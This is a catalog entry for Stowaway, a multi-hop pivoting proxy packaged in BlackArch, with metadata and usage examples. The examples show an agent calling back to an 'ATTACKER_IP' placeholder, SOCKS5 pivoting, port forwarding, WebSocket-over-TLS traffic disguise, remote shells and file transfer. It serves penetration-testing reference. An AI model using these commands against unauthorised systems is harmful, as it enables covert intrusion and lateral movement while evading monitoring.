---
name: "stowaway"
categories:
  - blackarch-proxy
version: "v2.2.r43.g7f715be"
homepage: "https://github.com/ph4ntonn/Stowaway"
packaged-by: [blackarch, nixpkgs]
blackarch-builddate: "2026-03-07"
build-system: go
license: MIT
meta-checked: "2026-11-09"
github-repo: "ph4ntonn/Stowaway"
github-stars: 3431
github-pushed: "2026-03-03"
github-archived: false
github-issues: 6
github-match: "exact"
gh-checked: "2026-11-07"
worth: 6.0
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 1
gh-activity-checked: "2026-11-09"
---

# stowaway

> Multi-hop proxy that chains agent nodes into a tree and exposes the pivoted network through a single admin console.

## What it's for

Stowaway tunnels traffic from an operator's machine through one or more reachable hosts ("agents") into networks that lie behind them, managed entirely from one `stowaway_admin` console. Each hop becomes a node in a tree: from the console you can open SOCKS5 proxies, map ports forward and backward, drop to a shell, and move files through any node. Links between nodes can be encrypted with AES-256-GCM under a shared secret, upgraded to TLS, masqueraded as WebSocket or HTTP traffic to pass reverse proxies, or carried over SSH tunnels. It is a pivoting tool for layered networks (for example an exposed host that can reach an inner segment); it is not an anonymizer, and the admin accepts only one directly connected agent — deeper trees are grown from the console. Cross-platform single binaries (Linux, macOS, Windows, MIPS, ARM).

## Typical use cases

### Start the simplest two-node chain

Run the admin listener, then point an agent at it from the target network.

```
./stowaway_admin -l 9999 -s Password1
./stowaway_agent -c ATTACKER_IP:9999 -s Password1 --reconnect 10
```

Outcome: the agent connects back and appears as `Node[0]` (`detail` and `topo` in the console show it); inter-node traffic is AES-encrypted with the shared secret, and `--reconnect 10` makes the agent retry the link every 10 seconds if it drops.

### Pivot through a node with SOCKS5

Open a SOCKS5 listener that egresses through a chosen node.

```
(admin) >> use 0
(node 0) >> socks 1080 user Password1
```

Outcome: a SOCKS5 server starts on the admin side (not on the agent) listening on 0.0.0.0:1080 with the given credentials; point scanners or proxychains at it to reach networks behind node 0. `stopsocks` shuts it down.

### Reach a host only visible to a node (forward)

Map a remote ip:port onto a local port of the admin host.

```
(node 0) >> forward 9000 198.51.100.20:22
```

Outcome: the admin host listens on 0.0.0.0:9000 and relays through node 0 to 198.51.100.20:22, so `ssh -p 9000 user@127.0.0.1` lands on the inner host; `stopforward` lists and tears the mapping down.

### Expose a service on the operator side to the node (backward)

Reverse-map a listening port on the agent to a port on the admin host.

```
(node 0) >> backward 9001 22
```

Outcome: the agent is told to listen on 0.0.0.0:9001 and connections to it are bridged to port 22 on the admin host, letting hosts near the node reach a service on the operator's side; `stopbackward` closes it.

### Blend in behind a reverse proxy (WebSocket over TLS)

Carry node traffic as TLS-encrypted WebSocket sessions through nginx or a similar reverse proxy.

```
./stowaway_admin -l 8000 --tls-enable -s Password1 --down ws --heartbeat
./stowaway_agent -c proxy.example.com:8080 --tls-enable -s Password1 --domain proxy.example.com --up ws
```

Outcome: with the reverse proxy forwarding proxy.example.com:8080 to the admin's port 8000, agent traffic looks like ordinary secure WebSocket traffic; `--heartbeat` keeps the link alive across idle timeouts. Every node in the chain must set `--tls-enable` (TLS then replaces AES encryption; `-s` only authenticates nodes), and upstream/downstream protocol choices must match on both ends of each link.

### Extend the chain deeper from the console

Grow the tree when the next hop is reachable from an already-joined node.

```
(node 0) >> listen
[*] Please choose the mode(1.Normal passive / 2.IPTables Reuse / 3.SOReuse): 1
[*] Please input the [ip:]<port> : 10001
./stowaway_agent -c 198.51.100.20:10001 -s Password1
```

Outcome: node 0 starts listening on 10001 and the new agent joins as its child (`topo` shows the grown tree). `connect <ip:port>` attaches an already-listening agent instead, and `sshtunnel <ip:sshport> <agent port>` joins a node through an SSH hop so the stowaway traffic rides inside SSH.

### Operate on a node: shell and file transfer

Grab an interactive shell or move files over the existing channel.

```
(node 0) >> shell
(node 0) >> upload tool.7z tool.xxx
(node 0) >> download notes.txt notes.out
```

Outcome: `shell` opens an interactive shell on the node (tab completion is disabled in this mode); upload and download stream files between admin and node with a progress bar, no separate transfer tooling needed.

*No corpus evidence — derived from upstream documentation.*
